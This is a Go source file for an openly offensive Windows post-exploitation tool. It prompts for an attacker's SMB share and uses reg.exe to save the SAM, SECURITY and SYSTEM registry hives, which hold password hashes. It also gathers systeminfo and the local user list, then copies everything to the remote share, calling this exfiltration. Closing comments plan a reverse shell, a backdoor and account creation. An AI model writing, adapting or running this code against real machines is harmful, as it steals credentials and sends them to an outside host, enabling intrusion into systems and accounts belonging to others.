package main

import(
    "fmt"
    "os/exec"
)

func main() {

    var smb string

    fmt.Print("Where should we send tha l00tz? (UNC path of your SMB server EG \\\\10.13.3.7\\\\GUEST): ")
    fmt.Scanf("%s", &smb)
    fmt.Println("Will copy l00t to ", smb)

	fmt.Print("[*] Attempting to create C:\\dump_temp")

	d := exec.Command("cmd", "/C", "mkdir", "C:\\dump_temp")
    if err := d.Run(); err != nil { 
        fmt.Println("[!] Error: ", err)
    }   else {
		fmt.Println("[*] C:\\dump_temp created succesfully!")
	}

	fmt.Print("[*] Attempting to dump sam")

	s1 := exec.Command("reg.exe", "save", "hklm\\sam", "c:\\dump_temp\\sam.save")
    if err := s1.Run(); err != nil { 
        fmt.Println("[!] Error: ", err)
    }   else {
		fmt.Println("[*] sam dumped succesfully!")
	}

	fmt.Print("[*] Attempting to dump sam")

	s2 := exec.Command("reg.exe", "save", "hklm\\security", "c:\\dump_temp\\security.save")
    if err := s2.Run(); err != nil { 
        fmt.Println("[!] Error: ", err)
    }   else {
		fmt.Println("[*] security dumped succesfully!")
	}

	fmt.Print("[*] Attempting to dump sam")

	s3 := exec.Command("reg.exe", "save", "hklm\\system", "c:\\dump_temp\\system.save")
    if err := s3.Run(); err != nil { 
        fmt.Println("[!] Error: ", err)
    }   else {
		fmt.Println("[*] system dumped succesfully!")
	}

	fmt.Print("[*] Collecting Systeminfo")

	s4 := exec.Command("cmd", "/c", "systeminfo", ">", "sysinfo.txt")
    if err := s4.Run(); err != nil { 
        fmt.Println("[!] Error: ", err)
    }   else {
		fmt.Println("[*] Collecting Systeminfo succesfull!")
	}

	fmt.Print("[*] Collecting users")

	s5 := exec.Command("cmd", "/c", "net user", ">", "users.txt")
    if err := s5.Run(); err != nil { 
        fmt.Println("[!] Error: ", err)
    }   else {
		fmt.Println("[*] Collecting users succesfull!")
	}

	fmt.Print("[*] Sending to share\n")

	s6 := exec.Command("cmd", "/c", "copy", "c:\\dump_temp\\*", smb)
    if err := s6.Run(); err != nil { 
        fmt.Println("[!] Error: ", err)
    }   else {
		fmt.Println("[*] Exfiltration succesfull!")
	}
	
	//will remove the C:\dump_temp dir afterwards
	//will also add code to grab the privesc check module from powerup and run it aswell as send it back
	//future plans are to have a menu with options to send back shell, plant backdoor, create users etc

}
